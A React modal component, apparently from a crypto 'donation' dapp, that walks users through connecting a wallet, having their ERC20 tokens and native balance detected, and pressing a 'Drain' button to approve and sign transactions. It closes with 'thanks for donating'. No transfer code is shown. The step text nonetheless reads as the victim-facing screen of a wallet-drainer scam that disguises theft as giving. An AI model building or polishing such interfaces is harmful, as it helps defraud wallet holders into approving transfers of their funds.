// src/components/GuideModal.jsx
import React, { useState } from "react";
import { motion } from "framer-motion";

export default function GuideModal() {
  const [open, setOpen] = useState(false);

  const steps = [
    "Connect your wallet (Connect Wallet).",
    "The dapp will detect your ERC20 tokens and native balance.",
    "Click 'Drain' to approve / sign as needed.",
    "Transactions will be sent; you'll receive notifications.",
    "Done — thanks for donating!"
  ];

  return (
    <>
      <button
        onClick={() => setOpen(true)}
        className="px-3 py-2 bg-slate-800 text-white text-sm rounded-md hover:bg-slate-900 transition"
      >
        How it works
      </button>

      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 overflow-y-auto"
        >
          {/* Modal panel: always centered */}
          <motion.div
            initial={{ scale: 0.95, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.95, opacity: 0 }}
            transition={{ duration: 0.16 }}
            className="relative bg-white rounded-2xl p-6 w-full max-w-md shadow-lg"
            role="dialog"
            aria-modal="true"
          >
            {/* Close button */}
            <button
              onClick={() => setOpen(false)}
              aria-label="Close guide"
              className="absolute top-3 right-3 text-slate-600 hover:text-slate-800 text-xl leading-none"
            >
              ×
            </button>

            <h2 className="text-xl font-bold mb-4 text-slate-900">How to Donate</h2>

            <div className="space-y-3 text-slate-700">
              {steps.map((s, i) => (
                <div key={i} className="flex items-start gap-3">
                  <div className="min-w-[28px] h-6 flex items-center justify-center rounded-md bg-slate-100 text-slate-800 font-semibold">
                    {i + 1}
                  </div>
                  <div className="text-sm">{s}</div>
                </div>
              ))}
              <div className="mt-4 text-xs text-slate-500">
                Tip: If you don't see your wallet on mobile, try connecting via WalletConnect from the Connect modal.
              </div>
            </div>

            <div className="mt-6 flex items-center justify-end gap-3">
              <button
                onClick={() => setOpen(false)}
                className="px-3 py-2 text-sm rounded-md bg-gray-100 hover:bg-gray-200 transition"
              >
                Close
              </button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </>
  );
}
